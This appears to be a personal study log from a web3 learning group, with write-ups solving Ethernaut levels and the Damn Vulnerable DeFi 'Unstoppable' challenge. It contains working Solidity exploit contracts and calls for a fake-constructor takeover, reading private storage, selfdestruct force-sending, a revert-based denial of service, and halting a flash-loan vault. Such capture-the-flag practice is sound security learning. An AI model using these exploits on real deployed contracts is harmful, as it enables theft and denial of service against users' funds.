---
timezone: Asia/Shanghai 
---

# silver

1. 自我介绍 想多学习些web3知识

2. 你认为你会完成本次残酷学习吗？ 尽力

## Notes

<!-- Content_START -->

### 2024.08.29

Ethernaut 

#### fallout

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

要求成为合约的owner，看了代码只有一个函数有设置owner的功能：

```
  /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```

虽然注释写了是构造函数，但是其实不是（是Fal1out而非Fallout），所以可以直接调用，就可以成为owner。

#### vault

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

可以看到虽然password是私有变量，但是可以通过读取对应位置的storage或查看合约部署时的inputdata得到password。密码存放在第二个插槽中：
```
await web3.eth.getStorageAt("0xC2205dfcB5Ef96C4357ad8CDe94e5348E1e33f3D",1)
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
```



### 2024.08.30

#### Ethernaut - Elevator

```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

如果要top返回true，就要islastfloor第一次返回false，第二次返回true。building合约是调用的msg.sender，所以我们构造一个合约，其islastfloor函数满足这个逻辑就好，输入的参数不重要。

```
contract MockBuilding {
    uint count=0;
    function isLastFloor(uint256 a) external returns (bool){
        if (count==0){
            count++;
            return false;
        }else{
            return true;
        }
    }
    function callElevator(address addr) external{
        Elevator(addr).goTo(0);
    }
}
```


### 2024.08.31

Ethernaut 
#### Shop

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) { //调用者的price>=100且从未buy过
            isSold = true;
            price = _buyer.price(); 
        }
    }
}
```

要求price<100

看起来类似电梯那个题目，但是buyer.price()是view的函数，不能更改状态。所以只能利用外部进行。发现isSold变量在两次调用price之间有更改。因此写合约利用这个isSold返回不同的bool值.

```
contract buyer{
    address shop =0xc3Ce8A0921980063AadA4cf475CA91C7e8E81a63;
    function price() external view returns (uint256){
        if (Shop(shop).isSold()==false){
            return 120;
        }else{
            return 0;
        }
    }
    function callshop()external{
        Shop(shop).buy();
    }
}
```



#### Force

这一关的目标是使合约的余额大于0

这个合约没有实现任何方法来接受以太。

但是可以通过合约自毁的方式，指定将余额转给Force合约。

POC:

```
pragma solidity ^0.8.0;

contract mine{
    constructor()payable {
    }

    function forcetransfer()public {
        selfdestruct(payable(0xcaa382a24236a3FB17A40367e4FC0961214B8cF3));
    }

}
```



#### King

要求成为king，阻止关卡重新声明王位


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

给大于prize的value，或作为owner就可以改变king

为了防止owner改变king，我们成为king之后，让这个transfer失败回滚.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract tobeking{

    receive() external payable {
        revert();
    }
    function start(address payable king)public payable{
         (bool success, ) = king.call{value:1000000000000000}("");
         require(success);
    }
}
```

不过要注意的是，不写receive函数也可以达到目的，即没法直接收款。另外，在转账的时候，必须用call，注意把address标记为payable。

### 2024.09.02
#### damnvulnerabledefi - Unstoppable

There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There’s a monitoring contract to check liveness of the flashloan feature.

Starting with 10 DVT tokens in balance, show that it’s possible to halt the vault. It must stop offering flash loans.

我们初始有10 token，要让闪电贷项目暂停，看监控合约代码可知，需要监控合约调用闪电贷时发生回滚：

```
function checkFlashLoan(uint256 amount) external onlyOwner {
        require(amount > 0);
        address asset = address(vault.asset());
        try vault.flashLoan(this, asset, amount, bytes("")) {
            emit FlashLoanStatus(true);
        } catch {//这里，如果回滚就会暂停
            emit FlashLoanStatus(false);
            vault.setPause(true);
            vault.transferOwnership(owner);
        }
    }
```

然后看flashLoan函数：

```
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0);
        if (address(asset) != _token) revert UnsupportedCurrency(); 
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // 这里，如果返回false则会回滚
        ......
}

    function convertToShares(uint256 assets) public view virtual returns (uint256) {
        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());// 一个是totalsuppy，一个是balance(this)，只要转账给合约即可，如：10*totalSupply/balance = 10*10eN/(10eN+1),
    }
```

测试：

```
    function test_unstoppable() public checkSolvedByPlayer {
        console.log(token.balanceOf(address(this)));
        token.transfer(address(vault), 1e18);
    }	
```

### 2024.09.03


### 2024.09.04


<!-- Content_END -->
